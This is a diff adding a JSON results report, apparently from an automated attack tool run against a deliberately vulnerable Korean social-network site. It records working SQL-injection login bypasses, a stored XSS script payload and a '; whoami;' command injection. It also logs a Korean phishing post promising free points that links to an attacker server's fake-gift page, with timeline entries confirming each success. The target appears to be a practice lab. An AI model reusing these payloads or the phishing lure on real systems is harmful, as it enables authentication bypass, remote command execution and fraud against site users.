@@ -1,0 +1,143 @@
+{
+  "metadata": {
+    "target": "http://3.34.181.145",
+    "attacker_server": "http://13.158.67.78:5000",
+    "start_time": "2025-11-07 16:17:59",
+    "end_time": "2025-11-07 16:18:13",
+    "duration_seconds": 13,
+    "attacker_user_id": "1",
+    "tool_version": "1.0"
+  },
+  "summary": {
+    "total_vulnerabilities": 5,
+    "critical_count": 2,
+    "high_count": 3,
+    "vulnerability_breakdown": {
+      "sql_injection": 2,
+      "file_upload": 1,
+      "lfi": 0,
+      "xss": 2,
+      "csrf": 0
+    }
+  },
+  "vulnerabilities": {
+    "sql_injection": [
+      {
+        "url": "http://3.34.181.145/login.php",
+        "username": "admin",
+        "password": "' or '1'='1' --",
+        "description": "Basic single quote OR bypass (Error-based confirmed)",
+        "errors_found": [
+          "mysql",
+          "sql syntax",
+          "error in your sql"
+        ],
+        "impact": "HIGH - Database information disclosure via errors",
+        "cvss_score": 8.0
+      },
+      {
+        "url": "http://3.34.181.145/login.php",
+        "username": "admin",
+        "password": "' or 1=1#",
+        "description": "Hash comment bypass",
+        "response_time": 0.010384082794189453,
+        "bypass_method": "Advanced SQL Injection",
+        "redirect_location": "index.php",
+        "final_url": "http://3.34.181.145/index.php",
+        "impact": "CRITICAL - Authentication bypass via advanced SQLi",
+        "cvss_score": 9.8
+      }
+    ],
+    "xss": [
+      {
+        "url": "http://3.34.181.145/new_post.php",
+        "payload": "🎁 특별 이벤트! 🎁\n\n무료 10,000 포인트 받기!\n지금 클릭하세요: http://13.158.67.78:5000/fake-gift\n\n선착순 100명! 서두르세요!",
+        "description": "Social engineering + CSRF attack via malicious post",
+        "attack_type": "phishing_csrf",
+        "target_url": "http://13.158.67.78:5000/fake-gift",
+        "attacker_id": "1",
+        "impact": "CRITICAL - CSRF allows unauthorized actions on behalf of victim",
+        "cvss_score": 8.8
+      },
+      {
+        "type": "Stored XSS - Pattern Hijacking Success",
+        "url": "http://3.34.181.145/new_post.php",
+        "payload": "<script>alert(2)</script>",
+        "payload_type": "exact_copy_number2",
+        "level": 1,
+        "success_indicators": [
+          "alert_2_or_3",
+          "english_words",
+          "korean_short",
+          "target_text",
+          "alert_function"
+        ],
+        "verification_method": "Pattern hijacking + count analysis",
+        "alert_message": "대머리/빡빡이 (or alternatives)",
+        "hijack_success": true,
+        "korean_success": true,
+        "impact": "HIGH - XSS pattern hijacking successful",
+        "cvss_score": 8.8
+      }
+    ],
+    "csrf": [],
+    "lfi": [],
+    "file_upload": [
+      {
+        "type": "Command Injection via POST",
+        "url": "http://3.34.181.145/new_post.php",
+        "parameter": "content",
+        "payload": "; whoami;",
+        "indicators_found": [
+          "TEST_",
+          "Ubuntu"
+        ],
+        "response_preview": "<!DOCTYPE html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>홈 - Vulnerable SNS</title>\n    <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css\">\n    <style>\n        /* CSS는 원본 그대로 사용 */\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell,",
+        "impact": "CRITICAL - Remote Command Execution via POST injection",
+        "cvss_score": 9.8
+      }
+    ]
+  },
+  "attack_timeline": [
+    {
+      "timestamp": "2025-11-07 16:17:59",
+      "type": "ADVANCED_SQL_INJECTION",
+      "description": "Successfully bypassed authentication using: Hash comment bypass",
+      "severity": "CRITICAL",
+      "details": {
+        "payload": "username=admin, password=' or 1=1#",
+        "method": "Hash comment bypass",
+        "bypass_technique": "Advanced SQL Injection",
+        "response_time": 0.010384082794189453,
+        "points": 0
+      }
+    },
+    {
+      "timestamp": "2025-11-07 16:18:09",
+      "type": "XSS_CSRF",
+      "description": "Malicious post created with CSRF attack link",
+      "severity": "CRITICAL",
+      "details": {
+        "post_url": "http://3.34.181.145/new_post.php",
+        "attack_url": "http://13.158.67.78:5000/fake-gift",
+        "attacker_id": "1",
+        "method": "Social engineering phishing"
+      }
+    },
+    {
+      "timestamp": "2025-11-07 16:18:13",
+      "type": "SETUP",
+      "description": "Generated fake-gift.html attack page",
+      "severity": "INFO",
+      "details": {
+        "filename": "fake-gift.html",
+        "attacker_id": "1",
+        "attack_server": "http://13.158.67.78:5000"
+      }
+    }
+  ],
+  "artifacts": {
+    "uploaded_webshell": null,
+    "fake_gift_page": "fake-gift.html"
+  }
+}
